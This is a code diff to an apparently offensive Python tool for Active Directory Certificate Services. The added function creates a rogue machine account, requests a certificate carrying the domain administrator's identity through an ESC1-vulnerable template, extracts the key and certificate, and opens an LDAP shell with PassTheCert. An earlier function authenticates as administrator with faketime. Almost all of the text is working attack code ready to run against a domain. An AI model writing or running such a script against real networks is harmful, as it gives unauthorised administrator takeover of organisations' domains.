@@ -1,6 +1,8 @@
 import subprocess
 import json
 import os
+import time
+
 def run_certipy_find(username, password, domain, dc_ip=None):
     cmd = [
         "certipy-ad", "find",
@@ -23,12 +25,13 @@ def run_certipy_find(username, password, domain, dc_ip=None):
 
 def save_results_to_json(data, filepath):
     try:
+        os.makedirs(os.path.dirname(filepath), exist_ok=True)
         with open(filepath, "w") as f:
             json.dump(data, f, indent=4)
         print(f"[+] Results saved to {filepath}")
     except Exception as e:
         print(f"[!] Failed to save results: {e}")
-# ESC1
+
 def exploit_esc1(username, password, domain, dc_ip, ca_name, template_name):
     print("[*] Exploiting ESC1 vulnerability...")
 
@@ -50,7 +53,6 @@ def exploit_esc1(username, password, domain, dc_ip, ca_name, template_name):
         print(f"[!] Certipy request failed: {e}")
         return
 
-    # Build and run the faketime + auth command exactly as you'd run in terminal
     auth_cmd = f'faketime "$(ntpdate -q {domain} | cut -d \' \' -f 1,2)" certipy-ad auth -pfx administrator.pfx -domain {domain}'
     if dc_ip:
         auth_cmd += f' -dc-ip {dc_ip}'
@@ -60,6 +62,79 @@ def exploit_esc1(username, password, domain, dc_ip, ca_name, template_name):
         subprocess.run(auth_cmd, shell=True, check=True)
     except subprocess.CalledProcessError as e:
         print(f"[!] Certipy auth failed: {e}")
+
+def exploit_esc1_domain_computer(username, password, domain, dc_ip, ca_name, template_name):
+    print("[*] Exploiting ESC1 vulnerability via Domain Computer account...")
+    
+    # Step 1: Add computer account
+    computer_name = "evilcomputer"
+    computer_pass = "Winter2025!"
+    
+    print("[*] Adding computer account...")
+    try:
+        subprocess.run([
+            "addcomputer.py",
+            f"{domain}/{username}:{password}",
+            "-computer-name", computer_name,
+            "-computer-pass", computer_pass,
+            "-dc-host", dc_ip
+        ], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"[!] Failed to add computer account: {e}")
+        return
+    
+    # Step 2: Request certificate as computer account
+    print("[*] Requesting certificate as computer account...")
+    try:
+        subprocess.run([
+            "certipy-ad", "req",
+            "-username", f"{computer_name}$",
+            "-password", computer_pass,
+            "-ca", ca_name,
+            "-target", domain,
+            "-template", template_name,
+            "-upn", f"administrator@{domain}",
+            "-dc-ip", dc_ip
+        ], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"[!] Certipy request failed: {e}")
+        return
+    
+    # Step 3: Extract cert and key
+    print("[*] Extracting certificate and key...")
+    try:
+        subprocess.run([
+            "certipy-ad", "cert",
+            "-pfx", "administrator.pfx",
+            "-nocert",
+            "-out", "administrator.key"
+        ], check=True)
+        
+        subprocess.run([
+            "certipy-ad", "cert",
+            "-pfx", "administrator.pfx",
+            "-nokey",
+            "-out", "administrator.crt"
+        ], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"[!] Failed to extract certificate or key: {e}")
+        return
+    
+    # Step 4: Start LDAP shell
+    print("[*] Starting LDAP shell with PassTheCert...")
+    try:
+        subprocess.run([
+            "python3", "PassTheCert/Python/passthecert.py",
+            "-action", "ldap-shell",
+            "-crt", "administrator.crt",
+            "-key", "administrator.key",
+            "-domain", domain,
+            "-dc-ip", dc_ip
+        ], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"[!] Failed to start LDAP shell: {e}")
+
+# ... [keep the existing ESC4 and ESC7 functions unchanged] ...
 # ESC4
 def exploit_esc4(domain, dc_ip, username, password, ca_name, template_name):
     user = f"{username}@{domain}"
